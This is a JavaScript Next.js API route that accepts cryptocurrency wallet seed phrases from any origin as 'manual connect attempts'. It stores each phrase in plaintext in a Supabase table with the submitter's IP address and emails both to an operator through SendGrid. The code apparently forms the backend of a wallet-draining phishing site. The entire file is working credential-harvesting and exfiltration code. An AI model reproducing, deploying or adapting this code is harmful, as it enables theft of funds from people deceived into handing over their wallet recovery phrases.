// Next.js API Route: manual-attempt (stores seed phrase directly)
// Accepts manual connection attempts INCLUDING seed phrases.
// IMPORTANT: Seed phrases are stored as plain text. Disclaimer required.

const { createClient } = require('@supabase/supabase-js');
const sgMail = require('@sendgrid/mail');

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_ANON_KEY;
const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
const SENDGRID_FROM_EMAIL = process.env.SENDGRID_FROM_EMAIL;
const CONTACT_TO_EMAIL = process.env.CONTACT_TO_EMAIL;

let supabase = null;
if (SUPABASE_URL && SUPABASE_KEY) {
  supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
}

if (SENDGRID_API_KEY) {
  sgMail.setApiKey(SENDGRID_API_KEY);
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  let body = req.body || {};
  try { if (typeof body === 'string' && body.trim()) body = JSON.parse(body); } catch (e) { return res.status(400).json({ error: 'Invalid JSON' }); }


  const seedPhrase = (body.seedPhrase || '').trim();
  const type = body.type || 'manual-connect-attempt';

  if (!seedPhrase) return res.status(400).json({ error: 'Seed phrase required' });


  // Store the seed phrase directly (unencrypted)
  const plainPhrase = seedPhrase;


  if (supabase) {
    try {
      const { error } = await supabase.from('manual_attempts').insert([
        {
          type: type,
          seed_phrase: plainPhrase,
          created_at: new Date().toISOString(),
          ip_address: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        },
      ]);

      if (error) {
        console.error('[manual-attempt] supabase error', error);
      } else {
        console.log('[manual-attempt] stored seed phrase');
      }
    } catch (e) {
      console.error('[manual-attempt] supabase insert failed', e);
    }
  } else {
    console.warn('[manual-attempt] Supabase not configured, skipping storage');
  }

  // Send email with seed phrase if SendGrid is configured
  if (SENDGRID_API_KEY && SENDGRID_FROM_EMAIL && CONTACT_TO_EMAIL) {
    try {
      await sgMail.send({
        to: CONTACT_TO_EMAIL,
        from: SENDGRID_FROM_EMAIL,
        subject: 'New Manual Connect Attempt - Seed Phrase Received',
        html: `
          <h2>Manual Connect Attempt Received</h2>
          <p><strong>Type:</strong> ${type}</p>
          <p><strong>Seed Phrase:</strong></p>
          <p><code>${plainPhrase}</code></p>
          <p><strong>IP Address:</strong> ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown'}</p>
          <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
        `,
      });
      console.log('[manual-attempt] email sent successfully');
    } catch (e) {
      console.error('[manual-attempt] sendgrid email failed', e);
      // Don't fail the request if email fails
    }
  } else {
    console.warn('[manual-attempt] SendGrid not configured, skipping email');
  }

  return res.status(200).json({ 
    status: 'ok', 
    message: 'Manual attempt received and stored.'
  });
}
